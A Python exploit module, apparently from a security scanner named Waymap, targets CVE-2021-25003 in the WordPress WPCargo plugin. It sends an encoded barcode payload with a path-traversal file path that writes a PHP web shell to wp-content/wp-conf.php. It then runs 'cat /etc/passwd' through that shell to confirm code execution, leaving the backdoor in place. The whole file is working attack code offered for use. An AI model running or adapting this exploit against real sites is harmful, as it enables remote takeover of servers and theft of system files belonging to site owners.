# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2021-25003

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def wpcargo_exploit(profile_url, timeout=5):
    payload = 'x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx'
    endpoint = f'wp-content/plugins/wpcargo/includes/barcode.php?text={payload}&sizefactor=.090909090909&size=1&filepath=../../../wp-conf.php'
    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    }

    try:
        session.get(url=profile_url + endpoint, headers=headers, allow_redirects=True, timeout=timeout, verify=False)
        validation_shell = session.post(url=profile_url + 'wp-content/wp-conf.php?1=system', headers=headers, allow_redirects=True, data={"2": "cat /etc/passwd"}, timeout=timeout, verify=False)

        if 'root:x:0:0:root' in validation_shell.text:
            print(f'[-] Shell successfully uploaded at {profile_url}wp-content/wp-conf.php')
            return True
        else:
            print(f'[+] Shell upload attempt failed at {profile_url}')
            return False
    except Exception as e:
        print(f'[!] Request to {profile_url} failed: {e}')
    return False

def scan_cve_2021_25003(profile_url):
    wpcargo_exploit(profile_url)


